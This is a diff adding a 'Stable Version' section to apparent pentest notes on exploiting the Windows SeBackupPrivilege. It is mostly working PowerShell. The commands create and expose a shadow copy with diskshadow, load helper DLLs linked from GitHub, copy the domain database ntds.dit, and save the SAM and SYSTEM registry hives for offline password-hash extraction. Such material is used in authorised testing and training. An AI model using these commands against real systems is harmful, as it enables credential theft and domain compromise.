@@ -2,6 +2,32 @@
 
 Exploit with `SeBackupPrivilege`.
 
+# Stable Version
+
+```powershell
+mkdir C:\mane
+
+echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
+echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
+echo "create" | out-file ./diskshadow.txt -encoding ascii -append    
+echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
+
+diskshadow.exe /s c:\mane\diskshadow.txt
+```
+
+```powershell
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Copy-FileSeBackupPrivilege Z:\Windows\NTDS\ntds.dit C:\mane\ntds.dit
+
+reg save HKLM\SYSTEM system
+reg save HKLM\SAM sam
+```
+
+[DLL Download Link](https://github.com/k4sth4/SeBackupPrivilege)
+
+# More Version
+
 You need to setup NTFS Disk to support remote windows backup.
 
 ## 0x0 Pre-setup ntfs
